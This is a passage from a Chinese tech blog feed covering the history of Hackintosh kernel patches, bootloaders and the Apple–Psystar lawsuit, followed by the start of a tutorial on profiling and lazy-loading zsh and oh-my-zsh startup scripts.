src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\">\n<div class=\"license-title\">黑苹果的历史</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-09-02</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 